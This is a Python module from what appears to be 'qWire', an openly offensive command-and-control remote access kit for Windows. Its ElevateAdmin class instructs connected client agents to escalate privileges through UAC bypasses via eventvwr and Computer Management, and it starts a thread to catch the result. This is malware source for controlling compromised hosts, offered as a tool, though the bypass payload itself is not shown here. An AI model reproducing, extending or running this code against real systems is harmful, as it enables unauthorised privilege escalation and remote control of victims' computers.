#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.23
# -------------------------------------------------------------
from core.networking.sockets.server_socket import ServerSocket
from core.networking.sockets.receiver_socket import ReceiverSocket
from core.client_handling.flags import ClientActionFlags
from core.threading.threads import MultiThreading

"""
Create a class to store communication functions
that will instruct the agent to elevate
"""
class ElevateAdmin:
    #Function will tell the client the client to elevate itself via eventvwr
    def uac_eventvwr(self,client,encryption_key):
        MultiThreading().create_background_thread_arg(ReceiverSocket().recv_uac_elev_stat,encryption_key)   #Create thread to catch response
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().esc_eventvwr}{ClientActionFlags().seperator} ') #Instruct client

    #Function will tell the client to elecate itself via eventvwr
    def uac_computer_mgmt(self,client,encryption_key):
        MultiThreading().create_background_thread_arg(ReceiverSocket().recv_uac_elev_stat,encryption_key)   #Create thread to catch response
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().esc_computermgmt}{ClientActionFlags().seperator} ') #Instruct client
